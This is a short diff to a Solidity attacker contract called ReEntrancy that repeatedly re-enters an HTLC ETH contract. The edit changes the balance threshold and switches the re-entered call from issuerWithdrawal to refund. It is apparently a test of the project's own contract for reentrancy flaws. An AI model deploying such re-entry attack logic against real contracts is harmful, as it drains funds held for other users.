@@ -22,9 +22,10 @@ contract ReEntrancy {
 
         // attack implementation
 
-        if(address(htlcEth).balance > 0.2 ether) {
+        if(address(htlcEth).balance >= 0.2 ether) {
 
-            htlcEth.issuerWithdrawal(id, secret);
+            //htlcEth.issuerWithdrawal(id, secret);
+            htlcEth.refund(id);
 
         }
           
@@ -36,7 +37,8 @@ contract ReEntrancy {
         id = _swapID;
         secret = _secretKey;
 
-        htlcEth.issuerWithdrawal(_swapID, _secretKey);
+        //htlcEth.issuerWithdrawal(_swapID, _secretKey);
+        htlcEth.refund(_swapID);
 
     }
 
